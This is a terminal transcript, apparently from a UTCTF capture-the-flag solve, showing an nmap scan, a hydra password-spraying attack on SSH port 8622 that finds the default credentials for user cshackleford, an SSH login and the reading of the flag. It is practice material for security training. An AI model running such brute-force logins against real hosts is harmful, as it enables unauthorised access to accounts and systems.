```sh
$ nmap misc2.utctf.live 8622
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for misc2.utctf.live (18.205.162.101)
Host is up (0.12s latency).
rDNS record for 18.205.162.101: ec2-18-205-162-101.compute-1.amazonaws.com
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 2 IP addresses (1 host up) scanned in 39.28 seconds
$ hydra -s 8622 -L worldist.txt -p defaultpw5678! 18.205.162.101 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:7/p:1), ~1 try per task
[DATA] attacking ssh://18.205.162.101:8622/
[8622][ssh] host: 18.205.162.101   login: cshackleford   password: defaultpw5678!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
$ ssh cshackleford@18.205.162.101 -p8622
cshackleford@18.205.162.101's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: cannot create temp file for here-document: Read-only file system
cshackleford@3e64db1cbff7:~$ cat flag.txt
utflag{conventions_knowledge_for_the_win}
cshackleford@3e64db1cbff7:~$ logout
Connection to 18.205.162.101 closed.
```